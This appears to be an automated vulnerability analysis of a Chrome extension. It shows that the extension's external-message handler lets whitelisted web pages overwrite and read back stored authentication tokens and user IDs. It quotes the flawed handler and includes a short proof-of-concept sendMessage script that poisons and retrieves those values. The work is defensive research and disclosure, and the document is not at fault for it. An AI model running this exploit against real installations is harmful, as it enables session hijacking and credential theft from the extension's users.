# CoCo Analysis: hddappnkhbmbfnpekaejnneejhohdokh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (authToken)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hddappnkhbmbfnpekaejnneejhohdokh/opgen_generated_files/bg.js
Line 985    } else if (request.session) {
Line 986        chrome.storage.local.set({ authToken: request.session.authorization });
```

**Code:**

```javascript
// Background script - Message handler (bg.js Line 977)
chrome.runtime.onMessageExternal.addListener(async function (request, sender, sendResponse) {
    if (request.info) {
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken,  // ← leaks stored token back to attacker
            userId: userId
        });
    } else if (request.session) {
        chrome.storage.local.set({ authToken: request.session.authorization }); // ← attacker-controlled
        chrome.storage.local.set({ userId: request.session.userId }); // ← attacker-controlled
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken,  // ← sends poisoned data back to attacker
            userId: userId
        });
    } else if(request.logout) {
        chrome.storage.local.set({ authToken: "" });
        chrome.storage.local.set({ userId: "" });
        sendResponse({
            authToken: "",
            userId: ""
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker from whitelisted domain (engage.yuja.com) or localhost:3000
chrome.runtime.sendMessage(
    "hddappnkhbmbfnpekaejnneejhohdokh",  // extension ID
    {
        session: {
            authorization: "attacker_controlled_token",
            userId: "attacker_controlled_id"
        }
    },
    function(response) {
        console.log("Poisoned storage with:", response);
        // Extension immediately sends back the poisoned values
    }
);

// Later, attacker can retrieve the poisoned data:
chrome.runtime.sendMessage(
    "hddappnkhbmbfnpekaejnneejhohdokh",
    { info: true },
    function(response) {
        console.log("Retrieved poisoned data:", response.authToken, response.userId);
    }
);
```

**Impact:** Complete storage exploitation chain. Attacker can poison the extension's storage with arbitrary authToken and userId values, and immediately retrieve them via sendResponse. This allows an attacker on whitelisted domains to manipulate authentication state and potentially hijack user sessions. The extension also has a "get_auth" functionality that allows reading stored credentials back to the attacker.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (userId)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hddappnkhbmbfnpekaejnneejhohdokh/opgen_generated_files/bg.js
Line 985    } else if (request.session) {
Line 987        chrome.storage.local.set({ userId: request.session.userId });
```

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, targeting the userId field. Both are part of the same complete storage exploitation chain where attacker can write and immediately read back poisoned values via sendResponse.

**Impact:** Part of the authentication credential manipulation attack described in Sink 1.
